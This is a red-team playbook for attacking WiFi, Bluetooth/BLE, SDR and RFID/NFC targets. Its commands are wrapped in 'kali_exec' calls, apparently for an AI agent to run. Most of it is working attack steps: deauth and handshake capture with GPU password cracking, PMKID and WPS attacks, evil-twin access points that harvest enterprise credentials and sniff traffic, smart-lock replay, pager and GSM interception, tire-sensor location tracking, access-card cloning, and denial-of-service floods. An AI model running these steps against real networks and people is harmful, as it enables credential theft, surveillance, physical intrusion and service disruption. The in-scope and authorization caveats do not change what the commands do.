# PLAYBOOK: Wireless & RF Security
# April 2026 Red Team Stack
# WiFi · Bluetooth · BLE · ZigBee · SDR · RFID/NFC
# Az's HP Kali rig with 2GB NVIDIA GPU is ideal for this

---

## Hardware Requirements

```
MINIMUM:
  WiFi adapter supporting monitor mode + packet injection
  Recommended: Alfa AWUS036ACH (dual-band, high gain)
  Alternative: Alfa AWUS036NHA (2.4GHz only but rock solid)

IDEAL FOR THIS STACK:
  RTL-SDR dongle (~$25) — passive RF spectrum scanning
  HackRF One (~$300) — TX+RX, full spectrum attacks
  Bluetooth adapter supporting HCI raw mode
  Proxmark3 (~$300) — RFID/NFC cloning
  Flipper Zero (optional) — Swiss army knife for RF
  Az's HP Kali rig: GPU useful for hashcat WPA/WPA2 cracking
```

---

## PHASE 1 — ENVIRONMENT SETUP

```bash
# Via Kali MCP or direct on HP Kali rig:

# Put WiFi adapter in monitor mode
kali_exec("sudo airmon-ng check kill")
kali_exec("sudo airmon-ng start wlan0")
# Result: wlan0mon interface created

# Verify injection capability
kali_exec("sudo aireplay-ng --test wlan0mon")

# Check Bluetooth HCI
kali_exec("hciconfig -a")
kali_exec("sudo hciconfig hci0 up")

# RTL-SDR test
kali_exec("rtl_test -t")

# Check GPU for hashcat (Az's 2GB NVIDIA)
kali_exec("hashcat -I | grep -A5 'CUDA'")
```

---

## PHASE 2 — WiFi RECONNAISSANCE

```bash
# Passive scan — all networks
kali_exec("sudo airodump-ng wlan0mon --output-format csv -w loot/[MISSION]/wireless/scan")
# Let run 5+ minutes — builds full picture

# Target specific AP once identified
kali_exec("sudo airodump-ng -c [CHANNEL] --bssid [TARGET_BSSID] wlan0mon -w loot/[MISSION]/wireless/target")

# Identify encryption type, clients, SSID
# Look for:
# - WEP (rare but instant crack)
# - WPA2-Personal (crack with GPU)
# - WPA2-Enterprise (PEAP/EAP-TLS — harder)
# - WPS enabled (Pixie Dust attack)
# - WPA3 (modern, much harder)
# - Open networks (rogue AP bait)
# - Hidden SSIDs (probe request reveal)
```

**Using HexStrike OSINT for wireless context:**
```
Using hexstrike-ai OSINT tools:
Query WiGLE.net for [TARGET_LOCATION] wireless networks.
Find: known SSIDs associated with [COMPANY], BSSID history,
geolocation data, encryption types observed historically.
```

---

## PHASE 3 — WPA2-PERSONAL ATTACKS

### 3A — Handshake Capture + GPU Crack

```bash
# Capture 4-way handshake
kali_exec("sudo airodump-ng -c [CHANNEL] --bssid [BSSID] -w loot/[MISSION]/wireless/handshake wlan0mon")

# In parallel — deauth to force reconnect
kali_exec("sudo aireplay-ng -0 5 -a [BSSID] -c [CLIENT_MAC] wlan0mon")

# Verify capture
kali_exec("sudo aircrack-ng loot/[MISSION]/wireless/handshake*.cap")

# GPU crack with hashcat (Az's 2GB NVIDIA)
kali_exec("hcxpcapngtool -o hash.hc22000 loot/[MISSION]/wireless/handshake*.cap")
kali_exec("hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt --force -d 1")
# -d 1 = use first GPU device

# With rules (much more powerful):
kali_exec("hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force -d 1")

# Mask attack for common patterns:
kali_exec("hashcat -m 22000 hash.hc22000 -a 3 ?u?l?l?l?d?d?d?d --force -d 1")
# Tries: Capital + 3 lowercase + 4 digits (Company2024! patterns)
```

### 3B — PMKID Attack (No Client Needed)

```bash
# Capture PMKID without waiting for client
kali_exec("sudo hcxdumptool -o loot/[MISSION]/wireless/pmkid.pcapng -i wlan0mon --active_beacon --enable_status=3")
# Wait 2-5 minutes

# Extract hashes
kali_exec("hcxpcapngtool -o hash.hc22000 loot/[MISSION]/wireless/pmkid.pcapng")

# Crack
kali_exec("hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt --force -d 1")
```

### 3C — WPS Pixie Dust Attack

```bash
# Check WPS status
kali_exec("sudo wash -i wlan0mon")
# Look for: WPS Locked: No → vulnerable

# Pixie Dust
kali_exec("sudo reaver -i wlan0mon -b [BSSID] -K 1 -vvv")
# If Pixie Dust fails, try brute force (slow):
# sudo reaver -i wlan0mon -b [BSSID] -vvv
```

---

## PHASE 4 — WPA2-ENTERPRISE ATTACKS

**More common in corporate environments.**

### Evil Twin + PEAP Credential Capture

```bash
# Set up rogue AP mimicking corporate SSID
kali_tmux_new("hostapd-wpe")
kali_write_file("/tmp/hostapd-wpe.conf", f"""
interface=wlan0
driver=nl80211
ssid={TARGET_SSID}
channel=6
ieee8021x=1
eap_server=1
eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
ca_cert=/etc/hostapd-wpe/certs/ca.pem
server_cert=/etc/hostapd-wpe/certs/server.pem
private_key=/etc/hostapd-wpe/certs/server.key
dh_file=/etc/hostapd-wpe/certs/dh
auth_algs=3
wpa=2
wpa_key_mgmt=WPA-EAP
rsn_pairwise=CCMP
""")
kali_tmux_send("hostapd-wpe", "sudo hostapd-wpe /tmp/hostapd-wpe.conf")

# Credentials appear in /tmp/hostapd-wpe.log
# MSCHAPv2 hashes → crack with hashcat -m 5500 or asleap
kali_exec("asleap -C [challenge] -R [response] -W /usr/share/wordlists/rockyou.txt")
```

---

## PHASE 5 — ROGUE ACCESS POINT / EVIL TWIN

```bash
# Full evil twin with DHCP + internet + traffic capture
kali_write_file("/tmp/evil_twin.sh", """
#!/bin/bash
# Interface setup
sudo airmon-ng start wlan0
sudo airbase-ng -a [TARGET_BSSID] --essid "[TARGET_SSID]" -c [CHANNEL] wlan0mon &
sleep 2

# Bridge to internet (requires second adapter connected to network)
sudo brctl addbr br0
sudo brctl addif br0 eth0 at0
sudo ifconfig br0 up

# DHCP server
sudo dnsmasq --interface=at0 --dhcp-range=192.168.10.100,192.168.10.200

# Traffic capture
sudo tcpdump -i br0 -w /loot/[MISSION]/wireless/evil_twin_capture.pcap
""")
kali_exec("bash /tmp/evil_twin.sh")

# Credential extraction from capture:
kali_exec("tcpdump -r /loot/[MISSION]/wireless/evil_twin_capture.pcap -A | grep -E 'password|pass|auth|login'")
```

---

## PHASE 6 — BLUETOOTH / BLE

```bash
# BLE device discovery
kali_exec("sudo btlesniffer -c")
# OR
kali_exec("sudo hcitool lescan")
kali_exec("sudo gatttool -b [BLE_MAC] -I")

# Bluetooth classic scan
kali_exec("sudo hcitool scan")
kali_exec("sudo sdptool browse [BT_MAC]")

# BlueBorne check (CVE-2017-1000251)
kali_exec("sudo bluetoothctl scan on")

# BLE man-in-the-middle
kali_exec("sudo bettercap -iface wlan0")
# In bettercap: ble.recon on; ble.show

# KNOB Attack (Key Negotiation Of Bluetooth)
# Downgrade encryption key entropy to 1 byte → brute force
# Requires HackRF or similar
```

**IoT/Smart Lock BLE attacks (common scope in physical red team):**
```bash
# Enumerate BLE services on smart lock
kali_exec("sudo gattacker scan")

# Replay attack
kali_exec("sudo gattacker connect [MAC]")
# Read all characteristics, replay unlock commands
```

---

## PHASE 7 — SDR (Software Defined Radio)

**Requires RTL-SDR (~$25) or HackRF (~$300)**

```bash
# Passive spectrum scanning — identify signals
kali_exec("rtl_power -f 300M:1.7G:1M -g 30 -i 10 -e 1h loot/[MISSION]/wireless/spectrum.csv")
kali_exec("heatmap.py loot/[MISSION]/wireless/spectrum.csv loot/[MISSION]/wireless/spectrum.png")

# FM radio (test RTL-SDR is working)
kali_exec("rtl_fm -f 100.3M -M fm -s 200k -r 48k - | play -r 48k -t raw -e s -b 16 -c 1 -V1 -")

# ADS-B aircraft tracking (passive OSINT — useful for physical red team)
kali_exec("dump1090 --quiet --raw --net --net-sbs-port 30003 &")

# Pager intercept (POCSAG) — hospitals/emergency services use these
kali_exec("rtl_fm -f 153.35M -s 22050 | multimon-ng -a POCSAG512 -a POCSAG1200 -a POCSAG2400 -f alpha -t raw -")

# 433MHz sensor sniffing (IoT devices, keyfobs, garage doors)
kali_exec("rtl_433 -f 433.92M -g 40")

# GSM capture (HackRF needed for TX, RTL-SDR for RX only)
kali_exec("grgsm_livemon -f 937.2M")

# TPMS (tire pressure sensors) — physical location tracking
kali_exec("rtl_433 -f 315M -g 30 -F json | tee loot/[MISSION]/wireless/tpms.json")
```

---

## PHASE 8 — RFID / NFC (Proxmark3 / Flipper Zero)

```bash
# NFC card read (Proxmark3)
kali_exec("proxmark3 /dev/ttyACM0")
# In proxmark console:
# hw tune
# hf search        ← auto-detect card type
# hf mf chk        ← check default keys (Mifare Classic)
# hf mf nested     ← nested attack for Mifare Classic
# hf mf dump       ← dump full card if auth successful
# hf mf restore    ← write to blank card (cloning)

# LF cards (access control, HID ProxCards)
# lf search
# lf hid read      ← read HID card
# lf hid clone -r [RAW_DATA]   ← clone to T55xx card

# Flipper Zero equivalent via CLI
kali_exec("flipperzero-cli nfc read")
kali_exec("flipperzero-cli rfid read")
```

---

## PHASE 9 — DEAUTH / DISRUPTION (In-Scope Only)

```bash
# Targeted deauth (force specific client off network)
kali_exec("sudo aireplay-ng -0 10 -a [AP_BSSID] -c [CLIENT_MAC] wlan0mon")

# Broadcast deauth (deauth ALL clients — use only with explicit DoS scope)
kali_exec("sudo aireplay-ng -0 0 -a [AP_BSSID] wlan0mon")

# MDK4 SSID flood (confuse WiFi scanners)
kali_exec("sudo mdk4 wlan0mon b -c 6")

# Caution: These are highly visible and can affect business operations
# ALWAYS get explicit written authorization for DoS testing
```

---

## GPU Cracking Reference (Az's HP — 2GB NVIDIA)

```
ALGORITHM      SPEED (2GB GPU)   TIME TO CRACK (rockyou 14M words)
──────────────────────────────────────────────────────────────────
WPA2 (22000)   ~100k H/s         ~2-3 minutes (rockyou)
                                  ~6-10 hours (rockyou + rules)
NTLM           ~2B H/s           Seconds (rockyou)
MD5            ~5B H/s           Instant (rockyou)
SHA256         ~1B H/s           Seconds (rockyou)
bcrypt         ~10k H/s          Hours-days (rockyou)
```

**For WPA2 GPU cracking — optimize for Az's setup:**
```bash
# Check GPU utilization during crack
watch -n1 nvidia-smi

# Reduce memory usage if OOM errors
hashcat -m 22000 hash.hc22000 wordlist.txt --force -d 1 -w 1
# -w 1 = low workload (prevents desktop lag, better for 2GB VRAM)

# Generate custom wordlist from company info first
cewl https://target.com -d 3 -m 6 -w custom_wordlist.txt
hashcat -m 22000 hash.hc22000 custom_wordlist.txt --force -d 1
```

---

## Evidence Collection

```
loot/[MISSION]/wireless/
├── scan.csv              # Full airodump scan
├── target_*.cap          # Captured handshakes/PMKIDs
├── hash.hc22000          # Extracted hashcat format
├── cracked.txt           # Cracked passwords
├── spectrum.csv          # SDR spectrum scan
├── evil_twin_capture.pcap # Evil twin traffic
├── ble_devices.json      # BLE device inventory
├── rfid_dumps/           # Cloned card data
└── report.md             # Wireless findings
```

---

*April 2026 | Wireless testing — always in-scope, always authorized*
*Az's HP Kali rig with 2GB NVIDIA: excellent for WPA2 GPU cracking*
